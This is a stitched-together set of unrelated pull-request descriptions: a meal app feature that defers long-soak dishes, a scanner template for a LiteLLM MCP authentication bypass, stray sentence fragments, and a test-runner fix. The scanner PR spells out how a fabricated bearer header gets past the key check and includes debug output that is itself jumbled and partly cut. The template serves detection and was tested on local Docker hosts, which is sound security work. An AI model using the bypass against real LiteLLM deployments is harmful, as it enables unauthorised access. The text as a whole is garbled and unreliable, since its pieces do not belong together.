- **Not a "cook now" pick.** A dish whose opening step takes 2 hours or more of waiting is left out of the current picks. That's Rajma and Boiled Chana (8-hour soak) and Bhatura (dough rests 2 hours). It is computed from the recipe (`aheadHours` in `toRankRecipe`), the same rule the plan-ahead feature already used.
- **Offered for later instead.** suggest-meals and the preview return an `ahead` list. Home's evening plan card offers those dishes first ("Rajma tomorrow? Soak it tonight").
- **When the soaking is done, it's back.** That means the dish is planned for today and ticked, or was started from the cook screen and its time has passed. Home then sends it as `prepped` and offers it to cook now. Asking for it ("kuch rajma wala") still shows it.
- **The cook screen asks first,** above the photo: "This step takes 8 hr. Is it done already?"
  - **"Yes, it's done"** goes straight to the cooking.
  - **"Start it now, cook later"** saves the plan with the time it'll be ready and goes back.

Checked in the preview build at iPhone size: Home no longer offers Rajma to cook now; the cook screen asks first; "Yes" moves to step 2.

## Checklist

- [x] Every screen state handled (loading, empty, offline, error): when nothing else fits, the old list is still shown; the question only shows on an opening long step
- [x] New tables have RLS policies and a pgTAP test; `python3 tools/archgen/build.py --check` passes: no new tables; the plan stays on the phone
- [x] No hard-coded copy: strings are in `apps/mobile/src/i18n/*.json`: 4 new strings in en, hi, Hinglish and kn
- [x] Touch targets ≥ 48 dp (≥ 56 dp in Cook), labels for screen readers: two full-width standard buttons
- [x] Voice writes go through the confirmation gate: no voice changes
- [x] Tests added or updated: cook-now vs plan-ahead, prepped, asked-for, no main ingredient (347 app, 100 Edge Function)

body:
### PR Information

<!-- Explains the information and/or motivation for update or/ creating this templates -->
<!-- Please include any reference to your template if available -->

- Added CVE-2026-59822. LiteLLM before 1.84.0 lets a request to the MCP Streamable HTTP endpoint reach the MCP gateway with a fabricated `Authorization: Bearer sk-...` value. The handler treats any `Authorization` header whose LiteLLM key check fails as an OAuth2 token for an upstream MCP server, and replaces the failed check with an empty `UserAPIKeyAuth()`, so no valid LiteLLM key is needed. The template opens an MCP session with a JSON-RPC `initialize` and matches the LiteLLM MCP server banner in the SSE response.
- The template sends two requests on purpose. The first has no `Authorization` header and shows that the endpoint enforces authentication. The second sends the fabricated bearer and shows that the same endpoint accepts it. Without the control request, a LiteLLM with authentication disabled also answers `200` with the same banner, but that is a different issue and not this CVE.
- References: https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q, https://github.com/BerriAI/litellm/pull/26463, https://github.com/BerriAI/litellm/releases/tag/v1.84.0, https://nvd.nist.gov/vuln/detail/CVE-2026-59822, https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-59822

### Template validation

<!-- Clarifies if the valdation of the template was done on an actual system for which the template was developed -->
<!-- If this concerns a vulnerability check, please clarify if validation was done on a known vulnerable system and optionally on a known not vulnerable system to avoid false positives -->

- [x] Validated with a host running a vulnerable version and/or configuration (True Positive)
- [x] Validated with a host running a patched version and/or configuration (avoid False Positive)

#### Additional Details (leave it blank if not applicable)

<!-- Include `nuclei -debug` output along with Shodan / Fofa / Google Query / Docker or screenshots if available -->
<!-- Please do NOT include vulnerable host information in pull requests -->
<!-- None of the prerequisites are obligatory; they are merely intended to speed the review process. -->

Both instances were built locally with Docker, so no third-party host was touched. Images: `litellm/litellm:v1.83.14-stable.patch.3` for the vulnerable version and `litellm/litellm:v1.84.0` for the patched one, each with a Postgres 16 container behind `DATABASE_URL`. The database matters for the reproduction: without a connected database the key check fails earlier with a `400 No connected db.` ProxyException, which the OAuth2 fallback does not catch, so the bypass is only reachable on a database-backed proxy, which is the documented production setup.

Vulnerable version, `litellm/litellm:v1.83.14-stable.patch.3`:

```

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"nuclei","version":"1.0"}}}

HTTP/1.1 500 Internal Server Error
{"error":"MCP request failed","details":""}

Host: 127.0.0.1:4000
Authorization: Bearer ***
Accept: application/json, text/event-stream
Content-Type: application/json

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"nuclei","version":"1.0"}}}
[DBG] [CVE-2026-59822] Dumped HTTP response http://127.0.0.1:4000/mcp/
HTTP/1.1 200 OK
Content-Type: text/event-stream
data: {"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2025-06-18","capabilities":{"experimental":{},"prompts":{"listChanged":false},"resources":{"subscribe":false,"listChanged":false},"tools":{"listChanged":false}},"serverInfo":{"name":"litellm-mcp-server","version":"1.0.0"}}}

[CVE-2026-59822:auth-bypass] [http] [high] http://127.0.0.1:4000/mcp/
[CVE-2026-59822:word-2] [http] [high] http://127.0.0.1:4000/mcp/
[INF] Scan completed in 37.707ms. 2 matches found.
```

Patched version, `litellm/litellm:v1.84.0`, same two requests:

```
[DBG] [CVE-2026-59822] Dumped HTTP response http://127.0.0.1:4001/mcp/
```

The bearer value in the output is generated by `{{randstr}}` for that run and is not a real key. A third local instance, `v1.83.14-stable.patch.3` without `master_key`, answers `200` with the same banner even without an `Authorization` header, and the template correctly does not report it, because the first request already gets through.

double questions are split, ordered answers get distinct steps, the improvement
proposal asks for several kinds, and usual mode, trip mode and trip purposes share

metro and train apart.

author: jtbinith
body:
Found by #96's first factory run (Day 10), which stopped here for the wrong reason.

### What happened
#96's agent made two `test:` commits (unit tests in f42aa46, a browser check in 4f75dbc), then the fix. The runner's red check runs each `test:` commit on its own with `npm test`, which is `test:unit && test:browsers`. At 4f75dbc the unit tests from f42aa46 still fail (the fix comes later), so `&&` never reached the browser test, and the runner stopped with "no assertion fails in one of its new tests".

### Fix
`proveRed` runs both suites whatever the first one does (`npm run test:unit; …; npm run test:browsers; …`) and fails if either fails. `npmTest` is unchanged for every other caller.

### Red → green
- `94602f8 test:` fails (proveRed still uses `npm test`).
- head: `npm run test:unit` 186/186.
- Replayed on #96's 4f75dbc with the new command: the browser test now runs and fails on its own check, `FAIL C, which heard late that B took over, shows B's "Joined", not its own "No match" (["No match. Tap again together"])`, and the runner names it (1 of 1).
